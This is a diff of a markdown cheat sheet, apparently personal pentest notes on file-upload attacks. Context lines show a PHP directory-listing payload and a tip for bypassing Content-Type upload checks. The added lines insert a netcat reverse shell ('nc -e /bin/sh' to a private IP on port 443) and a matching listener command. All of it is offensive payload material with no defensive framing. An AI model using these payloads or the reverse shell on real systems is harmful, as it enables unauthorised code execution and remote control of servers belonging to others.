@@ -748,6 +748,13 @@ payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
 
 >bypass Bypass Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain link
 [Content-Type wordlist:](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
+
+>shell bash
+```
+nc -e /bin/sh 192.168.1.7 443
+nc -nlvp 443
+```
+>great  
 >پاشگر
 ```
 exploit.php
